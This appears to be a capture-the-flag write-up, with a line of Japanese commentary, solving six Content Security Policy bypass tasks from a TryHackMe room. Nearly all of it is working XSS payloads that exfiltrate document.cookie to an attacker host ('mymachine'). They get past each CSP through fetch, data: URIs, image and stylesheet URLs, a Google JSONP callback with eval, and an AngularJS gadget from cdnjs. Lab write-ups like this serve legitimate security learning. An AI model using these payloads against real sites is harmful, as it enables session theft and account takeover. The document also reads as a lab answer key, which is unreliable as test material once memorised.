# Content Security Policy  writeup
https://tryhackme.com/room/csp

## Task7

### #1
```HTTP
Content-Security-Policy: default-src * 'unsafe-inline';
```

```html
<script>fetch(`http://mymachine/${document.cookie}`)</script>
```

### #2
```HTTP
Content-Security-Policy: default-src *; style-src 'self'; script-src data:
```

```html
<script src="data:application/javascript,fetch(`http://mymachine/${document.cookie}`)"></script>
```

Content-Type指定は無くてもよい模様。
```html
<script src="data:,fetch(`http://mymachine/${document.cookie}`)"></script>
```

### #3
```HTTP
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; 
```

```html
<img id="hoge" src=""><script>document.getElementById('hoge').src="http://mymachine/" + document.cookie;</script>
```

### #4
```HTTP
Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
```

```html
<link id="hoge" rel="stylesheet" href="">
<script nonce="abcdef">document.getElementById('hoge').href="http://mymachine/" + document.cookie;</script>
```

### #5
```HTTP
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
```

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(window.open('http%3A%2F%2Fmymachine%2F'.concat(document.cookie)))"></script>
```

### #6
```HTTP
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
```

```html
<div class=""ng-app ng-csp>
  <base href=//cdnjs.cloudflare.com/ajax/libs/>
  <script src=angular.js/1.8.1/angular.js></script>
  <script src=prototype/1.7.2/prototype.js></script>
  {{$on.curry.call().console.log($on.curry.call().location=("http://mymachine/"+$on.curry.call().document.cookie))}}
</div>
```





